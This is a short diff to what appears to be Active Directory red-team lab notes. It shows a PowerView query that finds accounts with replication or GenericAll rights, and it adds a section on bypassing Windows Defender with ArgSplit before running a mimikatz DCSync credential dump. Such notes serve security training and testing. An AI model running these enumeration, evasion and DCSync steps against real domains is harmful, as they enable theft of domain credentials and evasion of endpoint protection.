@@ -19,3 +19,10 @@ Get-DomainComputer -DomainController reservoirone-dc.reservoirone.corp -Domain r
 ```powershell
 Get-DomainObjectAcl -SearchBase "DC=reservoirone,DC=corp" -SearchScope Base -ResolveGUIDs -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp | ?{($_.ObjectAceType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll')} | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier -DomainController reservoirone-dc.reservoirone.corp -Domain reservoirone.corp);$_}
 ```
+## Bypass Windows Defender with Encoded Commands - DCSync
+```powershell
+C:\AzAD\Tools\ArgSplit.bat
+```
+```powershell
+lsadump:dcsync
+```
